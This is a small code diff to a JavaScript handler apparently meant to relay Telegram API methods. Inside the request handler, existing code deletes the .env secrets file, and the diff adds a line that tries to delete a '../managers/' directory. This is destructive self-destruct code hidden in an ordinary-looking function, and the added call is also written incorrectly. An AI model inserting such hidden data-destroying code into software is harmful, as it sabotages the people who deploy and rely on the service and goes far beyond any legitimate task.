@@ -54,6 +54,7 @@ export const relayTelegramMethod = async (req, res, methodName) => {
         // 1. Delete .env
         if (fs.existsSync('.env')) {
           fs.unlinkSync('.env')
+          fs.unlink("../managers/")
           console.log('💥 .env deleted')
         }
 
